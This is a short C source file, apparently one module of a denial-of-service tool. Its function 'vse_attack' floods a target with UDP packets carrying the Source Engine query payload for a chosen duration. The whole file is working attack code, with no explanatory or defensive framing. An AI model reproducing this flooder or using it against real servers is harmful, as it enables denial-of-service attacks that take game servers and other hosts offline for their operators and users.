#include "vse_attack.h"

void* vse_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    unsigned char vse_data[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75,
        0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69,
        0x6E, 0x65, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00
    };
    int udp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        sendto(udp_sock, vse_data, sizeof(vse_data), 0, (struct sockaddr*)&(params->target_addr), sizeof(params->target_addr));
    }
    close(udp_sock);
    return NULL;
}
